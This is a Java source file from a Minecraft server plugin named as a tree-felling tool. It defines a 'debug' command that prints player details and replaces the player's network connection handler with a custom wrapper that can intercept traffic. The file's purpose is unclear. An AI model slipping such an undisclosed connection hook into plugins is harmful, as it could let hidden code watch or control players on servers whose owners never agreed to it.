package me.bow.treecapitatorultimate.commands.Miscs;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.PlayerConnectionBase;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import net.minecraft.server.v1_15_R1.EntityPlayer;
import net.minecraft.server.v1_15_R1.PlayerConnection;
import org.bukkit.craftbukkit.v1_15_R1.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.ArrayList;

public class Debug extends Command {
    public Debug() {
        super("debug", "Debug", CommandCategory.Miscs, 0);
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        p.sendMessage(Start.Prefix + "Name: " + p.getName());
        p.sendMessage(Start.Prefix + "Display name: " + p.getDisplayName());
        p.sendMessage(Start.Prefix + "Health: " + p.getHealth());
        p.sendMessage(Start.Prefix + "Health scale: " + p.getHealthScale());
        p.sendMessage(Start.Prefix + "Locale: " + p.getLocale());
        p.sendMessage(Start.Prefix + "Op: " + p.isOp());
        p.sendMessage(Start.Prefix + "Dead: " + p.isDead());
        try {
            inject(p);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    private void inject(Player player) throws Exception {

        EntityPlayer entityPlayer = ((CraftPlayer)player).getHandle();
        PlayerConnection oldConnection = entityPlayer.playerConnection;

        // seems we have already injected into this player.
        if (oldConnection instanceof PlayerConnectionBase) {
            Start.ErrorString(player, "PlayerConnectionBase already injected into player " + player.toString());
        }

        PlayerConnectionBase newConnection = new PlayerConnectionBase(entityPlayer.server, oldConnection.networkManager, entityPlayer);
        // Setup the new permissible
        newConnection.setOldConnection(oldConnection);

        // inject the new instance
        entityPlayer.playerConnection = newConnection;
    }
}
